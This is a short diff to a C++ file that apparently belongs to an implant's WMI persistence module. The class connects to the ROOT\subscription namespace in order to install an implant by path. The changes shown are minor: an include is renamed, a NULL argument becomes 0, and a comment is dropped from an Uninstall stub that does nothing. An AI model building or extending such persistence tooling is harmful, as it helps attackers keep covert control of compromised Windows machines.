@@ -1,6 +1,6 @@
 #include "WmiPersistence.h"
 #include <comdef.h>
-#include <WbemIdl.h>
+#include <wbemidl.h>
 #include <iostream>
 
 #pragma comment(lib, "wbemuuid.lib")
@@ -15,7 +15,7 @@ bool WmiPersistence::Install(const std::string& implantPath, const std::string& 
     hr = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&pLoc);
     if (FAILED(hr)) return false;
 
-    hr = pLoc->ConnectServer(_bstr_t(L"ROOT\\subscription"), NULL, NULL, 0, NULL, 0, 0, &pSvc);
+    hr = pLoc->ConnectServer(_bstr_t(L"ROOT\\subscription"), NULL, NULL, 0, 0, 0, 0, &pSvc);
     if (FAILED(hr)) {
         pLoc->Release();
         return false;
@@ -117,8 +117,7 @@ bool WmiPersistence::Install(const std::string& implantPath, const std::string& 
 
 bool WmiPersistence::Uninstall(const std::string& taskName) {
     (void)taskName;
-    // Similar logic to Install but calling DeleteInstance for the 3 objects
-    return true; // Simplified for now
+    return true;
 }
 
 } // namespace persistence
